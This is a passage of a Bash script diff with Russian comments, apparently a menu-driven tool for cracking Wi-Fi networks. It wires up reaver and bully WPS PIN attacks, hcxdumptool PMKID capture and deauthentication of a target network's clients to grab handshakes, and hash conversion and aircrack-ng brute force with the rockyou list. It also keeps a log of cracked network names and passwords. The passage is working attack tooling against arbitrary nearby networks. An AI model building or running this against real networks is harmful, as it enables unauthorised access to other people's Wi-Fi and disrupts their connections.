+        if [[ $key == $'\e' ]]; then read -rsn2 -t 0.1 rest; [ -z "$rest" ] && return; continue; fi
+        case "$key" in
+            e|E|у|У) edit_entry "$n" ;;
+            d|D|в|В)
+                echo -e "${YELLOW}$(t h_del_q)${NC}"
+                echo -e "${CYAN}[Enter] $(t yes) | [Esc] $(t no)${NC}"
+                local k2; IFS= read -rsn1 k2
+                if [[ $k2 != $'\e' ]]; then db_delete "$n"; return; fi ;;
+        esac
+    done
+}
+
+menu_history() {
+    migrate_db
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e "${CYAN}${BOLD}      $(t hist_t)      ${NC}"
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        local count=0 i=0 s b c p k d
+        if [ -s "$HACK_LOG" ]; then
+            printf " ${WHITE}%-3s %-16s %-17s %-4s %-14s %s${NC}\n" "No." "SSID" "BSSID" "Ch" "PSK" "$(t h_date)"
+            while IFS=$'\t' read -r s b c p k d; do
+                i=$((i+1))
+                printf " ${CYAN}%-3s${NC} %-16s %-17s %-4s %-14s %s\n" "$i" "$s" "$b" "$c" "$k" "$d"
+            done < "$HACK_LOG"
+            count=$i
+        else
+            echo -e " ${YELLOW}$(t hist_empty)${NC}"
+        fi
+        echo -e "${CYAN}----------------------------------------${NC}"
+        echo -e " ${WHITE}[1-$count] $(t h_sel) | [a] $(t h_add) | [Esc] $(t h_back)${NC}"
+        local key rest
+        if ! IFS= read -rsn1 -t 60 key; then continue; fi
+        if [[ $key == $'\e' ]]; then read -rsn2 -t 0.1 rest; [ -z "$rest" ] && return; continue; fi
+        case "$key" in
+            [1-9]) [ "$count" -gt 0 ] && menu_net_act "$key" ;;
+            a|A|ф|Ф) manual_add ;;
+        esac
+    done
+}
+
+menu_lang() {
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${GREEN}|$(L Русский Russian)"
+            "${BLUE}|English"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$(t lang_t)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                case "$num" in
+                    1) LANG_UI=ru; echo ru > "$LANG_FILE"; return ;;
+                    2) LANG_UI=en; echo en > "$LANG_FILE"; return ;;
+                    3) return ;;
+                esac ;;
+        esac
+    done
+}
+
+menu_tool() {
+    local tool="$1"
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${CYAN}|$(t upd)"
+            "${CYAN}|$(t reb)"
+            "${CYAN}|$(t frc)"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$tool" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                [ "$num" -eq 4 ] && return
+                case "$num" in
+                    1) run_cmd "installwh $tool" ;;
+                    2) run_cmd "installwh $tool --rebuild" ;;
+                    3) run_cmd "installwh $tool --force" ;;
+                esac ;;
+        esac
+    done
+}
+
+menu_tools() {
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${CYAN}|$(t t1)"
+            "${WHITE}|aircrack-ng"
+            "${WHITE}|pixiewps"
+            "${WHITE}|reaver"
+            "${WHITE}|bully"
+            "${WHITE}|hcxdumptool"
+            "${WHITE}|hcxtools"
+            "${CYAN}|$(t u_wh)"
+            "${YELLOW}|$(t t2)"
+            "${GREEN}|$(t t_base)"
+            "${GREEN}|$(t t_rock)"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$(t tools_t)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                case "$num" in
+                    1) run_cmd "installwh --status" ;;
+                    2) with_saved_idx menu_tool aircrack-ng ;;
+                    3) with_saved_idx menu_tool pixiewps ;;
+                    4) with_saved_idx menu_tool reaver ;;
+                    5) with_saved_idx menu_tool bully ;;
+                    6) with_saved_idx menu_tool hcxdumptool ;;
+                    7) with_saved_idx menu_tool hcxtools ;;
+                    8) run_cmd "installwh wh" ;;
+                    9) run_cmd "installwh --update-all" ;;
+                    10) clear; download_cracked_base force; press_any ;;
+                    11) clear; download_rockyou force; press_any ;;
+                    12) return ;;
+                esac ;;
+        esac
+    done
+}
+
+menu_settings() {
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${WHITE}|$(t m8)"
+            "${CYAN}|$(t m6)"
+            "${MAGENTA}|$(L "MAC-адрес" "MAC address")"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$(t settings_t)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                case "$num" in
+                    1) with_saved_idx menu_lang ;;
+                    2) with_saved_idx menu_tools ;;
+                    3) with_saved_idx menu_mac ;;
+                    4) return ;;
+                esac ;;
+        esac
+    done
+}
+
+menu_wps() {
+    require_mon || return
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${MAGENTA}|$(t w1)"
+            "${MAGENTA}|$(t w2)"
+            "${MAGENTA}|$(t w3)"
+            "${MAGENTA}|$(t w4)"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$(t wps_t)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                [ "$num" -eq 5 ] && return
+                if [ "$num" -le 3 ] && [ -z "$TARGET_BSSID" ]; then
+                    prompt_input "$(t pr_bssid)" TARGET_BSSID || continue
+                    prompt_input "$(t pr_chan)" TARGET_CHANNEL || continue
+                fi
+                case "$num" in
+                    1) run_cmd "reaver -i $MON -b $TARGET_BSSID -c $TARGET_CHANNEL -K -d 2 -t 5 -N -vv" ;;
+                    2) run_cmd "reaver -i $MON -b $TARGET_BSSID -c $TARGET_CHANNEL -d 2 -t 10 -N -vv" ;;
+                    3) local B; if B=$(get_bully); then run_cmd "$B -b $TARGET_BSSID -c $TARGET_CHANNEL -F -B $MON"
+                       else echo -e "${RED}$(t err_bully)${NC}"; sleep 2; fi ;;
+                    4) prompt_input "$(t pr_bssid)" TARGET_BSSID || continue
+                       prompt_input "$(t pr_chan)" TARGET_CHANNEL || continue ;;
+                esac ;;
+        esac
+    done
+}
+
+menu_wpa() {
+    # Монитор НЕ требуется для входа: 'Работа с хэшем' и брутфорс .cap — оффлайн.
+    # Монитор проверяется точечно только на пунктах реального захвата (см. ниже).
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${BLUE}|$(t p2air)"
+            "${BLUE}|$(t p5hash)"
+            "${BLUE}|$(t p1)"
+            "${BLUE}|$(t p2)"
+            "${BLUE}|$(t p3)"
+            "${BLUE}|$(t w4)"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$(t wpa_t)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                [ "$num" -eq 7 ] && return
+                # захват (1 PMKID-эфир, 3 handshake, 4 PMKID-цель) требует монитор
+                case "$num" in
+                    1|3|4) require_mon || continue ;;
+                esac
+                # пункты 3/4 (handshake/pmkid-цель) требуют цель
+                if [ "$num" -ge 3 ] && [ "$num" -le 4 ] && [ -z "$TARGET_BSSID" ]; then
+                    prompt_input "$(t pr_bssid)" TARGET_BSSID || continue
+                    prompt_input "$(t pr_chan)" TARGET_CHANNEL || continue
+                fi
+                case "$num" in
+                    1) pmkid_pipeline "" "" "" ;;                                  # PMKID скан всего эфира (без цели)
+                    2) pmkid_hash_entry ;;                                         # Работа с готовым хэшем (оффлайн, без монитора)
+                    3) local tag st base
+                       tag=$(sanitize_tag "" "$TARGET_BSSID"); st=$(stamp_now)
+                       base="$HS_DIR/handshake_${tag}_${st}"
+                       run_cmd "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $base $MON"
+                       fix_owner "$HS_DIR" "$base"* 2>/dev/null
+                       check_handshake_result "$base"; press_any ;;
+                    4) pmkid_pipeline "$TARGET_BSSID" "$TARGET_CHANNEL" "${TARGET_BSSID}" ;;  # PMKID по выбранной сети
+                    5) prompt_input "$(t pr_cap)" CAP_FILE "$HS_DIR/" || continue   # брутфорс .cap — оффлайн
+                       prompt_input "$(t pr_dict)" DICT "$ROCKYOU_BASE" || continue
+                       run_cmd "aircrack-ng -w $DICT $CAP_FILE" ;;
+                    6) prompt_input "$(t pr_bssid)" TARGET_BSSID || continue
+                       prompt_input "$(t pr_chan)" TARGET_CHANNEL || continue ;;
+                esac ;;
+        esac
+    done
+}
+
+# ── WPS Скан: живой список → лог → статичная таблица → атаки ──────────
+# Массивы результатов скана (заполняются scan_parse)
+SCAN_BSSID=(); SCAN_CH=(); SCAN_PWR=(); SCAN_WPS=(); SCAN_LCK=(); SCAN_VEN=(); SCAN_ESSID=()
+
+# Парсер вывода wash по позиции колонки ESSID из заголовка.
+# Дубли по BSSID убираются через seen[]. Все колонки сохраняются.
+scan_parse() {
+    local raw="$1"
+    SCAN_BSSID=(); SCAN_CH=(); SCAN_PWR=(); SCAN_WPS=(); SCAN_LCK=(); SCAN_VEN=(); SCAN_ESSID=()
+    local -A seen=()
+    local epos=-1 line
+    while IFS= read -r line; do
+        # строка заголовка задаёт позицию ESSID
+        if [[ $epos -lt 0 && $line == *BSSID* && $line == *ESSID* ]]; then
+            epos=$(awk -v s="$line" 'BEGIN{print index(s,"ESSID")-1}')
+            continue
+        fi
+        [ "$epos" -lt 0 ] && continue
+        # только строки, начинающиеся с MAC (BSSID)
+        [[ $line =~ ^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}: ]] || continue
+        local bssid ch pwr wps lck ven essid left
+        bssid=$(echo "$line" | awk '{print $1}')
+        [ -n "${seen[$bssid]:-}" ] && continue
+        seen[$bssid]=1
+        # ESSID — всё от позиции epos до конца (может содержать пробелы)
+        essid="${line:$epos}"
+        essid="${essid%"${essid##*[![:space:]]}"}"   # trim справа
+        # левая часть до ESSID разбивается по столбцам
+        left="${line:0:$epos}"
+        ch=$(echo "$left"  | awk '{print $2}')
+        pwr=$(echo "$left" | awk '{print $3}')
+        wps=$(echo "$left" | awk '{print $4}')
+        lck=$(echo "$left" | awk '{print $5}')
+        # Vendor — 6-е поле, если есть
+        ven=$(echo "$left" | awk '{print $6}')
+        [ -z "$essid" ] && essid="<hidden>"
+        SCAN_BSSID+=("$bssid"); SCAN_CH+=("$ch"); SCAN_PWR+=("$pwr")
+        SCAN_WPS+=("$wps"); SCAN_LCK+=("$lck"); SCAN_VEN+=("$ven"); SCAN_ESSID+=("$essid")
+    done <<< "$raw"
+}
+
+# Сохранение лога скана: wifi_ГГГГММДД_ЧЧММ_NN.log в $DATA_DIR
+scan_save_log() {
+    local n="${#SCAN_BSSID[@]}"
+    # уникальное имя: wifi_ГГГГММДД_ЧЧММ_<кол-во сетей>.log (без секунд)
+    local fname="$DATA_DIR/wifi_$(date '+%Y%m%d_%H%M')_${n}.log"
+    {
+        echo "# Wi-Fi WPS scan — $(date '+%Y-%m-%d %H:%M:%S')"
+        echo "# $(t scan_cnt) $n"
+        echo "#"
+        printf '%-18s %-3s %-5s %-4s %-4s %-10s %s\n' BSSID Ch Pwr WPS Lck Vendor ESSID
+        local i
+        for ((i=0; i<n; i++)); do
+            printf '%-18s %-3s %-5s %-4s %-4s %-10s %s\n' \
+                "${SCAN_BSSID[i]}" "${SCAN_CH[i]}" "${SCAN_PWR[i]}" \
+                "${SCAN_WPS[i]}" "${SCAN_LCK[i]}" "${SCAN_VEN[i]}" "${SCAN_ESSID[i]}"
+        done
+    } > "$fname"
+    fix_owner "$fname"
+    echo "$fname"
+}
+
+# Живой скан: wash крутится, Esc → стоп + сохранение лога.
+# Возвращает через глобальные SCAN_* + SCAN_LOGFILE.
+SCAN_LOGFILE=""
+scan_run_live() {
+    local tmp; tmp=$(mktemp)
+    clear
+    echo -e "${CYAN}${BOLD}  $(t scan_t) — WPS${NC}"
+    echo -e "${YELLOW}$(t scan_live)${NC}\n"
+    # wash в фоне пишет в tmp
+    stdbuf -oL wash -i "$MON" -F > "$tmp" 2>/dev/null &
+    local wpid=$!
+    # живой показ + ожидание Esc
+    local key
+    while kill -0 "$wpid" 2>/dev/null; do
+        # перерисовка живого списка
+        clear
+        echo -e "${CYAN}${BOLD}  $(t scan_t) — WPS${NC}"
+        echo -e "${YELLOW}$(t scan_live)${NC}\n"
+        tail -n 20 "$tmp" 2>/dev/null
+        # ждём клавишу до 1 сек; Esc → стоп
+        if IFS= read -rsn1 -t 1 key; then
+            if [[ $key == $'\e' ]]; then break; fi
+        fi
+    done
+    # стоп wash
+    kill "$wpid" 2>/dev/null; wait "$wpid" 2>/dev/null
+    scan_parse "$(cat "$tmp")"
+    rm -f "$tmp"
+    if [ "${#SCAN_BSSID[@]}" -eq 0 ]; then
+        SCAN_LOGFILE=""
+        return
+    fi
+    SCAN_LOGFILE="$(scan_save_log)"
+}
+
+# Статичная таблица с курсором ↑↓/1-9, Enter → атаки, Esc → выход
+scan_static_table() {
+    local n="${#SCAN_BSSID[@]}"
+    [ "$n" -eq 0 ] && { echo -e "\n${YELLOW}$(t scan_none)${NC}"; sleep 2; return; }
+    local sel=0
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e "${CYAN}${BOLD}      $(t scan_t) — WPS      ${NC}"
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        [ -n "$SCAN_LOGFILE" ] && echo -e " ${GREEN}$(t scan_saved)${NC} $SCAN_LOGFILE"
+        echo -e " ${YELLOW}$(t scan_cnt)${NC} $n\n"
+        printf "   ${WHITE}%-17s %-3s %-4s %-4s %-4s %-10s %s${NC}\n" \
+            BSSID Ch Pwr WPS Lck Vendor ESSID
+        local i
+        for ((i=0; i<n; i++)); do
+            local num=$((i+1))
+            local prefix="  " color="$NC"
+            # Lck=No зелёным, Lck=Yes тускло
+            case "${SCAN_LCK[i]}" in
+                No|no)   color="$GREEN" ;;
+                Yes|yes) color='\033[2m' ;;   # DIM
+            esac
+            if [ "$i" -eq "$sel" ]; then
+                printf "${BG_SEL} %d %-17s %-3s %-4s %-4s %-4s %-10s %s${NC}\n" \
+                    "$num" "${SCAN_BSSID[i]}" "${SCAN_CH[i]}" "${SCAN_PWR[i]}" \
+                    "${SCAN_WPS[i]}" "${SCAN_LCK[i]}" "${SCAN_VEN[i]}" "${SCAN_ESSID[i]}"
+            else
+                printf "${color} %d %-17s %-3s %-4s %-4s %-4s %-10s %s${NC}\n" \
+                    "$num" "${SCAN_BSSID[i]}" "${SCAN_CH[i]}" "${SCAN_PWR[i]}" \
+                    "${SCAN_WPS[i]}" "${SCAN_LCK[i]}" "${SCAN_VEN[i]}" "${SCAN_ESSID[i]}"
+            fi
+        done
+        echo -e "\n${CYAN}$(t scan_hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        case "$key" in
+            up)   ((sel>0)) && ((sel--)) ;;
+            down) ((sel<n-1)) && ((sel++)) ;;
+            esc)  return ;;
+            enter) scan_attack_menu "$sel" ;;
+            num:*) if [ "$num" -ge 1 ] && [ "$num" -le "$n" ]; then sel=$((num-1)); scan_attack_menu "$sel"; fi ;;
+        esac
+    done
+}
+
+# Меню атак для выбранной сети (индекс). Esc/Отмена → назад к таблице.
+# ── PMKID: захват → конвертация → взлом (онлайн/база/сохранить) ────────
+WPASEC_KEY_FILE="$DATA_DIR/.wpasec_key"
+CRACKED_BASE="$DATA_DIR/cracked.txt"
+
+# ── Подсветка живого потока hcxdumptool по типу фрейма ──
+# Улов (PMKID/EAPOL) — зелёным жирным; предвестники (AUTH/ASSOC) — жёлтым;
+# шум (BEACON/PROBERESPONSE) — тускло-серым. Всё остальное (стартовая инфа) — как есть.
+# Использует awk с fflush() для мгновенного (небуферизованного) вывода строк.
+# Подсветка живого потока. $1 = MAC цели (BSSID без разделителей, опц.) —
+# строки этой сети выделяются голубым, чтобы не путать с rogue-приманками.
+hcx_colorize() {
+    local tgt="${1:-}"
+    awk -v tgt="$tgt" '
+    {
+        line=$0
+        lc=tolower(line)
+        is_tgt = (tgt != "" && index(lc, tolower(tgt)) > 0)
+        if (line ~ /PMKID|EAPOL/)                 { printf "\033[1;32m%s\033[0m\n", line }   # зелёный жирный = улов (приоритет)
+        else if (is_tgt)                          { printf "\033[1;36m%s\033[0m\n", line }   # голубой жирный = ТВОЯ ЦЕЛЬ
+        else if (line ~ /AUTHENTICATION|ASSOCIATION|REASSOCIATION/) { printf "\033[0;33m%s\033[0m\n", line }  # жёлтый = предвестник
+        else if (line ~ /BEACON|PROBERESPONSE/)   { printf "\033[0;90m%s\033[0m\n", line }   # серый = шум
+        else                                       { print line }
+        fflush()
+    }'
+}
+# Запуск hcxdumptool с живой подсветкой, если есть stdbuf (иначе — прямой вывод).
+# $@ = аргументы hcxdumptool
+run_hcx() {
+    # Захват ПОЛНОСТЬЮ изолирован от сигналов терминала.
+    # Механика: hcxdumptool запускается в отдельной сессии (setsid) — Ctrl+C
+    # с клавиатуры НЕ доходит ни до него, ни до скрипта. Родитель в цикле
+    # следит: (а) жив ли захват, (б) не нажал ли юзер клавишу для остановки.
+    # Любая клавиша (Enter/Esc/пробел/Ctrl+C-как-символ) — мягкая остановка.
+    local logpipe rc
+    # цель для подсветки (BSSID без разделителей) — ставится вызывающим в HCX_TARGET
+    local ctgt="${HCX_TARGET:-}"
+    # запускаем в НОВОЙ сессии, вывод через подсветку; PID пишем в переменную
+    if command -v stdbuf >/dev/null 2>&1; then
+        setsid bash -c 'stdbuf -oL hcxdumptool "$@" 2>&1' _ "$@" | hcx_colorize "$ctgt" &
+    else
+        setsid bash -c 'hcxdumptool "$@" 2>&1' _ "$@" | hcx_colorize "$ctgt" &
+    fi
+    local pgid=$!            # PID группы пайпа
+    # ловим реальный PID hcxdumptool (в новой сессии) для остановки
+    local hpid="" tries=0
+    while [ -z "$hpid" ] && [ $tries -lt 20 ]; do
+        hpid=$(pgrep -n -f "hcxdumptool -i $MON" 2>/dev/null)
+        [ -z "$hpid" ] && { sleep 0.2; tries=$((tries+1)); }
+    done
+    # на время захвата глушим INT в самом скрипте (страховка)
+    trap ':' INT
+    # цикл наблюдения: пока захват жив — ждём нажатия клавиши (стоп)
+    local k
+    while kill -0 "$pgid" 2>/dev/null; do
+        # читаем клавишу с коротким таймаутом; любое нажатие = стоп
+        if IFS= read -rsn1 -t 1 k 2>/dev/null; then
+            break
+        fi
+    done
+    # останавливаем захват: сначала мягко (INT/TERM), затем гарантированно (KILL)
+    [ -n "$hpid" ] && kill -INT "$hpid" 2>/dev/null
+    kill -INT "$pgid" 2>/dev/null
+    sleep 0.3
+    [ -n "$hpid" ] && kill -TERM "$hpid" 2>/dev/null
+    kill "$pgid" 2>/dev/null
+    sleep 0.2
+    pkill -f "hcxdumptool -i $MON" 2>/dev/null
+    sleep 0.2
+    pkill -9 -f "hcxdumptool -i $MON" 2>/dev/null   # гарантия: не оставляем хвостов
+    wait "$pgid" 2>/dev/null
+    trap ':' INT
+    return 0
+}
+
+# Полный пайплайн PMKID для выбранной сети (bssid, канал, essid)
+pmkid_pipeline() {
+    local b="$1" ch="$2" essid="$3"
+    # hcxdumptool обязателен
+    if ! command -v hcxdumptool >/dev/null 2>&1; then
+        echo -e "\n${RED}$(t err_hcx)${NC}"; sleep 2; return
+    fi
+    # нужен монитор-интерфейс (hcxdumptool 6.2.9 работает через него)
+    if [ -z "$MON" ]; then
+        echo -e "\n${RED}$(t msg_nomon)${NC}"; sleep 2; return
+    fi
+    local stamp cap hash secs mode tag
+    stamp=$(stamp_now)
+
+    # цель есть? (b задан) → показываем активный режим; нет → скан всего эфира
+    local has_target=0
+    [ -n "$b" ] && has_target=1
+    if [ "$has_target" -eq 1 ]; then
+        tag=$(sanitize_tag "$essid" "$b")
+    else
+        essid="$(t pmk_alltgt)"; ch="*"; tag="air"
+    fi
+    cap="$PMKID_DIR/pmkid_${tag}_${stamp}.pcapng"
+    hash="$PMKID_DIR/pmkid_${tag}_${stamp}.22000"
+
+    # ── Шаг 1: режим захвата ──
+    local msel=0 options=(
+        "${WHITE}|$(t pmk_timer)"
+        "${WHITE}|$(t pmk_auto)"
+        "${WHITE}|$(t pmk_manual)"
+    )
+    # активные режимы (deauth по цели) — только когда выбрана конкретная сеть
+    if [ "$has_target" -eq 1 ]; then
+        options+=("${MAGENTA}|$(t pmk_active)")
+        options+=("${MAGENTA}|$(t pmk_hs_full)")
+    fi
+    options+=("${RED}|$(t atk_cancel)")
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}  $(t pmk_mode_t)${NC}"
+        echo -e " ${YELLOW}ESSID:${NC} $essid   ${YELLOW}Ch:${NC} $ch\n"
+        local i
+        for i in "${!options[@]}"; do
+            local color="${options[i]%%|*}" text="${options[i]#*|}"
+            if [ "$i" -eq "$msel" ]; then echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
+            else echo -e "${color} $((i+1)) ${text}${NC}"; fi
+        done
+        echo -e "\n${CYAN}$(t hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((msel+1))
+        case "$key" in
+            up)   ((msel>0)) && ((msel--)) ;;
+            down) ((msel<${#options[@]}-1)) && ((msel++)) ;;
+            esc)  return ;;
+            enter|num:*)
+                # номер вне диапазона видимых пунктов — игнор
+                [ "$num" -ge 1 ] && [ "$num" -le "${#options[@]}" ] || continue
+                local sel_text="${options[$((num-1))]#*|}"
+                case "$sel_text" in
+                    "$(t pmk_timer)")  mode=timer;  break ;;
+                    "$(t pmk_auto)")   mode=auto;   break ;;
+                    "$(t pmk_manual)") mode=manual; break ;;
+                    "$(t pmk_active)") mode=active; break ;;
+                    "$(t pmk_hs_full)") mode=handshake; break ;;
+                    "$(t atk_cancel)") return ;;
+                esac ;;
+        esac
+    done
+
+    # ── Шаг 2: захват (hcxdumptool 6.2.9 через монитор $MON) ──
+    # ВАЖНО: hcxdumptool запускается НА ПЕРЕДНЕМ ПЛАНЕ (foreground) — только так
+    #        6.2.9 гонит живой поток строк (TIME/FREQ/CH/MAC/ESSID) в реальном
+    #        времени, как на старых рабочих скринах. В фоне он этот поток глушит.
+    # Стоп: штатный Ctrl+C самого hcxdumptool (он так и подсказывает "stop with ctrl+c").
+    #       На время захвата отдаём Ctrl+C процессу hcxdumptool, скрипт не выкидывается,
+    #       т.к. foreground-процесс перехватывает SIGINT первым и завершается сам.
+    # "BPF is unset" — НОРМА (нет фильтра = весь эфир), не ошибка.
+    local ACTV="--filterlist_ap=$b --filtermode=2"
+    # ФИЛЬТР ЦЕЛИ: если выбрана конкретная сеть (has_target=1) — ловим ТОЛЬКО её
+    # во всех режимах (timer/auto/manual тоже!), иначе (весь эфир) — без фильтра.
+    local TGT=""
+    [ "$has_target" -eq 1 ] && TGT="$ACTV"
+    # Цель для ПОДСВЕТКИ в потоке (BSSID без разделителей, нижний регистр).
+    # Пусто для режима "весь эфир". hcxdumptool печатает MAC как ac15a2a0764b.
+    if [ "$has_target" -eq 1 ]; then
+        HCX_TARGET=$(printf '%s' "$b" | tr -d ':-' | tr 'A-F' 'a-f')
+    else
+        HCX_TARGET=""
+    fi
+    clear
+    echo -e "${YELLOW}$(t pmk_capturing)${NC}   ${CYAN}$(t pmk_stopctrlc)${NC}\n"
+    # Захват изолирован (setsid внутри run_hcx): стоп по ЛЮБОЙ клавише,
+    # Ctrl+C с клавиатуры не роняет скрипт. Страховочный trap на всякий.
+    trap ':' INT
+    case "$mode" in
+        timer)
+            prompt_input "$(t pmk_secs)" secs || { trap ':' INT; return; }
+            [[ "$secs" =~ ^[0-9]+$ ]] || secs=60
+            echo -e "\n${YELLOW}$(t pmk_capturing)${NC} (${secs}s)  ${CYAN}$(t pmk_stopctrlc)${NC}\n"
+            # фоновый killer остановит захват через $secs; Ctrl+C прервёт раньше (run_hcx ловит)
+            ( sleep "$secs"; pkill -INT -f "hcxdumptool -i $MON -o $cap" 2>/dev/null ) &
+            local tkill=$!
+            run_hcx -i "$MON" -o "$cap" --enable_status=31 $TGT
+            kill "$tkill" 2>/dev/null
+            ;;
+        auto)
+            # авто-стоп на первом PMKID: фоновый сторож шлёт INT в hcxdumptool.
+            # hcxdumptool в foreground → живой поток виден; сторож находит PID через pgrep.
+            echo -e "${YELLOW}$(t pmk_wait_auto)${NC}\n"
+            ( sleep 4
+              while :; do
+                local hp; hp=$(pgrep -n -f "hcxdumptool -i $MON -o $cap")
+                [ -z "$hp" ] && break
+                if [ -s "$cap" ] && hcxpcapngtool -o /dev/null "$cap" 2>/dev/null | grep -qiP 'written to 22000.*[1-9]'; then
+                    kill -INT "$hp" 2>/dev/null; break
+                fi
+                sleep 3
+              done ) &
+            local guard=$!
+            run_hcx -i "$MON" -o "$cap" --enable_status=31 $TGT
+            kill "$guard" 2>/dev/null
+            ;;
+        manual)
+            run_hcx -i "$MON" -o "$cap" --enable_status=31 $TGT
+            ;;
+        active)
+            echo -e "${MAGENTA}$(t pmk_active_run)${NC}\n"
+            run_hcx -i "$MON" -o "$cap" --enable_status=31 $ACTV
+            ;;
+        handshake)
+            # Полный handshake (M1-M4) через deauth: выбиваем клиента(ов) —
+            # они переподключаются к своему AP и отдают все 4 части рукопожатия.
+            # hcxdumptool 6.2.9 по умолчанию сам шлёт deauth; фильтр = только эта сеть.
+            trap ':' INT
+            echo -e "${CYAN}$(t hs_who)${NC}"
+            echo -e " ${WHITE}1${NC} $(t hs_all)"
+            echo -e " ${WHITE}2${NC} $(t hs_one)\n"
+            local hk; hk=$(read_key); local hnum="${hk#num:}"
+            [ "$hk" = "enter" ] && hnum=1
+            trap ':' INT
+            local HS_FILTER="--filterlist_ap=$b --filtermode=2"
+            if [ "$hnum" = "2" ]; then
+                # конкретный клиент — спросим MAC
+                trap ':' INT
+                local cmac; prompt_input "$(t hs_client_mac)" cmac || { trap ':' INT; HS_FILTER="--filterlist_ap=$b --filtermode=2"; }
+                trap ':' INT
+                # чистим MAC от разделителей (hcxdumptool ждёт 001122334455)
+                cmac=$(printf '%s' "$cmac" | tr -d ':-' | tr 'A-F' 'a-f')
+                [ -n "$cmac" ] && HS_FILTER="--filterlist_ap=$b --filterlist_client=$cmac --filtermode=2"
+            fi
+            echo -e "\n${MAGENTA}$(t hs_running)${NC}   ${CYAN}$(t pmk_stopctrlc)${NC}\n"
+            run_hcx -i "$MON" -o "$cap" --enable_status=31 $HS_FILTER
+            ;;
+    esac
+    trap ':' INT         # возвращаем глобальный предохранитель (не дефолт-убийцу)
+    stty sane 2>/dev/null
+    fix_owner "$PMKID_DIR" "$cap"
+
+    # ── Шаг 3: конвертация + статистика ──
+    if [ ! -f "$cap" ]; then
+        echo -e "\n${RED}$(t pmk_nofile)${NC}"; press_any; return
+    fi
+    if ! command -v hcxpcapngtool >/dev/null 2>&1; then
+        echo -e "\n${RED}$(t pmk_no_hcx)${NC}"; press_any; return
+    fi
+    local convout
+    convout=$(hcxpcapngtool -o "$hash" "$cap" 2>&1)
+    fix_owner "$hash"
+    # парсим статистику из вывода hcxpcapngtool
+    local n_pmkid n_hs n_net n_useless
+    n_pmkid=$(echo "$convout" | grep -i 'written to 22000' | grep -oP ':\s*\K[0-9]+' | head -1)
+    n_net=$(echo "$convout" | grep -i 'ESSID (total unique)' | grep -oP ':\s*\K[0-9]+' | head -1)
+    n_hs=$(echo "$convout" | grep -i 'EAPOL pairs (total)' | grep -oP ':\s*\K[0-9]+' | head -1)
+    n_useless=$(echo "$convout" | grep -i 'RSN PMKID (useless)' | grep -oP ':\s*\K[0-9]+' | head -1)
+    [ -z "$n_pmkid" ] && n_pmkid=0; [ -z "$n_hs" ] && n_hs=0; [ -z "$n_net" ] && n_net=0; [ -z "$n_useless" ] && n_useless=0
+
+    # умное имя: добавляем число готовых хэшей (как в логах сканов)
+    if [ "$n_pmkid" -gt 0 ]; then
+        local cap2="$PMKID_DIR/pmkid_${tag}_${stamp}_${n_pmkid}.pcapng"
+        local hash2="$PMKID_DIR/pmkid_${tag}_${stamp}_${n_pmkid}.22000"
+        mv -f "$cap" "$cap2" 2>/dev/null && cap="$cap2"
+        mv -f "$hash" "$hash2" 2>/dev/null && hash="$hash2"
+        fix_owner "$cap" "$hash"
+    fi
+
+    clear
